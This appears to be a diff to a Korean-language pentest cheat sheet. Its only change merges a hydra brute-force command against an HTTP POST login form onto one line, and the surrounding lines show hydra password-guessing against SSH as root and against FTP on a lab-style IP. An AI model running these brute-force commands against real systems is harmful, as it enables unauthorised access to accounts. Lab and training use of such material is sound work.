@@ -43,8 +43,7 @@ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10
 hydra -l anonymous -P pass.txt ftp://10.10.10.10
 
 # HTTP POST 로그인 폼
-hydra -l admin -P passwords.txt 10.10.10.10 http-post-form \
-  "/login.php:username=^USER^&password=^PASS^:F=로그인실패문구"
+hydra -l admin -P passwords.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=로그인실패문구"
 ```
 
 ## 결과 예시
